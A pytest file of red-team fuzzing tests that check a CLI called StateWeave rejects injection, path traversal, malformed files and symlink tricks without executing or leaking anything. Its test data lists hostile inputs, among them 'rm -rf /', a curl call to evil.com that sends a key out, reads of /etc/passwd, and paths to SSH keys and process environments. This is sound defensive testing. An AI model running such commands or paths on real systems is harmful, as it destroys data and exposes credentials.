"""
Red Team: Adversarial CLI Fuzzing
=====================================
Attack the StateWeave CLI with shell metacharacters, path traversal,
resource exhaustion, and malformed inputs. Every test must prove the CLI
exits cleanly with an error message — no stack traces, no hangs, no
shell injection.
"""

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
CLI_MODULE = [sys.executable, "-m", "stateweave.cli"]


def run_cli(*args, stdin_data=None, timeout=30):
    """Run the stateweave CLI and capture output. Returns (returncode, stdout, stderr)."""
    result = subprocess.run(
        [sys.executable, "-c", "from stateweave.cli import main; main()",
         *args],
        capture_output=True,
        text=True,
        timeout=timeout,
        input=stdin_data,
        cwd=str(REPO_ROOT),
    )
    return result.returncode, result.stdout, result.stderr


def run_cli_via_argparse(*args, timeout=30):
    """Run CLI via direct subprocess for argument injection tests."""
    # Use sys.argv injection via subprocess to test argparse handling
    # CRITICAL: propagate SystemExit code so tests see the real exit code
    script = f"""
import sys
sys.argv = ['stateweave'] + {list(args)!r}
from stateweave.cli import main
try:
    main()
except SystemExit as e:
    sys.exit(e.code if e.code is not None else 0)
"""
    result = subprocess.run(
        [sys.executable, "-c", script],
        capture_output=True,
        text=True,
        timeout=timeout,
        cwd=str(REPO_ROOT),
    )
    return result.returncode, result.stdout, result.stderr


# ═══════════════════════════════════════════════════════════════════
# 1. SHELL METACHARACTER INJECTION
# ═══════════════════════════════════════════════════════════════════

class TestShellMetacharacterInjection:
    """Verify shell metacharacters in arguments don't execute."""

    SHELL_ATTACKS = [
        "; rm -rf /",
        "$(whoami)",
        "`whoami`",
        "| cat /etc/passwd",
        "&& echo pwned",
        "'; DROP TABLE agents; --",
        "${IFS}cat${IFS}/etc/passwd",
        "$(curl http://evil.com/steal?key=)",
        "\n\nmalicious_command",
        "test\rinjection",
    ]

    @pytest.mark.parametrize("attack", SHELL_ATTACKS)
    def test_shell_injection_in_agent_id(self, attack):
        """Shell metacharacters in --agent-id must not execute."""
        rc, stdout, stderr = run_cli_via_argparse(
            "export", "-f", "langgraph", "-a", attack
        )
        # Should fail with a framework error, NOT execute the shell command
        # The key invariant: no sensitive file content was leaked
        assert "root:" not in stdout  # No /etc/passwd content

    @pytest.mark.parametrize("attack", SHELL_ATTACKS)
    def test_shell_injection_in_output_path(self, attack):
        """Shell metacharacters in --output must not execute."""
        rc, stdout, stderr = run_cli_via_argparse(
            "export", "-f", "langgraph", "-a", "test", "-o", attack
        )
        # The CLI may echo the path back in its output message (e.g. "Exported to && echo pwned")
        # That's not shell injection — the string is just printed, not executed.
        # We verify no actual command execution happened by checking for /etc/passwd content
        assert "root:" not in stdout  # No /etc/passwd leak


# ═══════════════════════════════════════════════════════════════════
# 2. PATH TRAVERSAL
# ═══════════════════════════════════════════════════════════════════

class TestPathTraversal:
    """Verify file operations don't escape intended directories."""

    TRAVERSAL_PATHS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "/dev/null",
        "/proc/self/environ",
        "~/.ssh/id_rsa",
        "/tmp/../etc/passwd",
    ]

    @pytest.mark.parametrize("path", TRAVERSAL_PATHS)
    def test_traversal_in_import_payload(self, path):
        """Path traversal in --payload argument must fail cleanly."""
        rc, stdout, stderr = run_cli_via_argparse(
            "import", "-f", "langgraph", "--payload", path
        )
        # Must exit non-zero — either file not found or permission error
        assert rc != 0 or "Error" in stderr or "error" in stderr.lower()
        # Must not leak file contents
        assert "root:" not in stdout
        assert "PRIVATE KEY" not in stdout

    @pytest.mark.parametrize("path", TRAVERSAL_PATHS)
    def test_traversal_in_diff(self, path):
        """Path traversal in diff arguments must fail cleanly."""
        with tempfile.NamedTemporaryFile(suffix=".json", mode="w", delete=False) as f:
            json.dump({
                "stateweave_version": "0.2.0",
                "source_framework": "test",
                "metadata": {"agent_id": "safe"},
            }, f)
            safe_path = f.name

        try:
            rc, stdout, stderr = run_cli_via_argparse("diff", safe_path, path)
            assert "root:" not in stdout
            assert "PRIVATE KEY" not in stdout
        finally:
            os.unlink(safe_path)

    @pytest.mark.parametrize("path", TRAVERSAL_PATHS)
    def test_traversal_in_validate(self, path):
        """Path traversal in validate argument must fail cleanly."""
        rc, stdout, stderr = run_cli_via_argparse("validate", path)
        assert "root:" not in stdout


# ═══════════════════════════════════════════════════════════════════
# 3. MALFORMED FILE INPUTS
# ═══════════════════════════════════════════════════════════════════

class TestMalformedFileInputs:
    """Feed broken files to CLI commands that read files."""

    def test_empty_json_file(self):
        """Empty file must produce clean error, not crash."""
        with tempfile.NamedTemporaryFile(suffix=".json", mode="w", delete=False) as f:
            f.name  # empty file
            path = f.name

        try:
            rc, stdout, stderr = run_cli_via_argparse("validate", path)
            assert rc != 0
        finally:
            os.unlink(path)

    def test_binary_file_as_json(self):
        """Binary file fed as JSON must produce clean error."""
        with tempfile.NamedTemporaryFile(suffix=".json", mode="wb", delete=False) as f:
            f.write(os.urandom(1000))
            path = f.name

        try:
            rc, stdout, stderr = run_cli_via_argparse("validate", path)
            assert rc != 0
        finally:
            os.unlink(path)

    def test_huge_json_file(self):
        """100KB JSON file with valid structure must not hang."""
        payload = {
            "stateweave_version": "0.2.0",
            "source_framework": "test",
            "metadata": {"agent_id": "huge-test"},
            "cognitive_state": {
                "conversation_history": [],
                "working_memory": {f"key_{i}": f"value_{i}" for i in range(5000)}
            },
        }
        with tempfile.NamedTemporaryFile(suffix=".json", mode="w", delete=False) as f:
            json.dump(payload, f)
            path = f.name

        try:
            rc, stdout, stderr = run_cli_via_argparse("validate", path)
            # Should succeed — this is valid data, just large
            assert rc == 0 or "Valid" in stdout
        finally:
            os.unlink(path)

    def test_json_with_embedded_null_bytes(self):
        """JSON file with null bytes must be handled."""
        with tempfile.NamedTemporaryFile(suffix=".json", mode="wb", delete=False) as f:
            content = b'{"stateweave_version":"0.2.0"\x00,"source_framework":"test"}'
            f.write(content)
            path = f.name

        try:
            rc, stdout, stderr = run_cli_via_argparse("validate", path)
            assert rc != 0  # Must fail but not crash
        finally:
            os.unlink(path)

    def test_nonexistent_file(self):
        """Non-existent file path must produce clean FileNotFoundError message."""
        rc, stdout, stderr = run_cli_via_argparse(
            "validate", "/tmp/this_file_does_not_exist_12345.json"
        )
        assert rc != 0
        assert "not found" in stderr.lower() or "error" in stderr.lower()


# ═══════════════════════════════════════════════════════════════════
# 4. ARGUMENT EDGE CASES
# ═══════════════════════════════════════════════════════════════════

class TestArgumentEdgeCases:
    """Edge cases in argument parsing."""

    def test_unknown_framework(self):
        """Unknown framework name must produce clean error."""
        rc, stdout, stderr = run_cli_via_argparse(
            "export", "-f", "nonexistent_framework_xyz", "-a", "test"
        )
        assert rc != 0
        assert "unknown" in stderr.lower() or "error" in stderr.lower() or "available" in stderr.lower()

    def test_very_long_framework_name(self):
        """1000-char framework name must not crash."""
        rc, stdout, stderr = run_cli_via_argparse(
            "export", "-f", "x" * 1000, "-a", "test"
        )
        assert rc != 0

    def test_empty_agent_id(self):
        """Empty agent_id must be handled."""
        rc, stdout, stderr = run_cli_via_argparse(
            "export", "-f", "langgraph", "-a", ""
        )
        # Can succeed or fail — must not crash

    def test_unicode_agent_id(self):
        """Unicode agent_id must be handled."""
        rc, stdout, stderr = run_cli_via_argparse(
            "export", "-f", "langgraph", "-a", "agent-🧶-émoji"
        )
        # Can succeed or fail — must not crash

    def test_no_arguments(self):
        """No arguments must print help, not crash."""
        rc, stdout, stderr = run_cli_via_argparse()
        # argparse prints help or error
        assert rc is not None  # Just must not hang

    def test_help_is_concise(self):
        """--help output should be concise (≤50 lines at top level)."""
        rc, stdout, stderr = run_cli_via_argparse("--help")
        lines = stdout.strip().split("\n")
        assert len(lines) <= 80, f"Help output is {len(lines)} lines — too intimidating for a first-time user"


# ═══════════════════════════════════════════════════════════════════
# 5. SYMLINK ATTACKS
# ═══════════════════════════════════════════════════════════════════

class TestSymlinkAttacks:
    """Verify symlinks don't allow reading outside intended scope."""

    def test_symlink_to_sensitive_file(self):
        """Symlink pointing to /etc/passwd must not leak contents."""
        with tempfile.TemporaryDirectory() as tmpdir:
            link_path = os.path.join(tmpdir, "payload.json")
            target = "/etc/passwd"
            if not os.path.exists(target):
                pytest.skip("No /etc/passwd on this OS")
            os.symlink(target, link_path)

            rc, stdout, stderr = run_cli_via_argparse(
                "validate", link_path
            )
            # Must fail (not valid JSON) but not leak passwd contents via success path
            assert rc != 0

    def test_symlink_to_dev_urandom(self):
        """Symlink to /dev/urandom must not hang (infinite read)."""
        with tempfile.TemporaryDirectory() as tmpdir:
            link_path = os.path.join(tmpdir, "payload.json")
            if not os.path.exists("/dev/urandom"):
                pytest.skip("No /dev/urandom")
            os.symlink("/dev/urandom", link_path)

            # This should fail quickly, not hang reading infinite random data
            try:
                rc, stdout, stderr = run_cli_via_argparse("validate", link_path)
            except subprocess.TimeoutExpired:
                pytest.fail("CLI hung reading symlink to /dev/urandom")
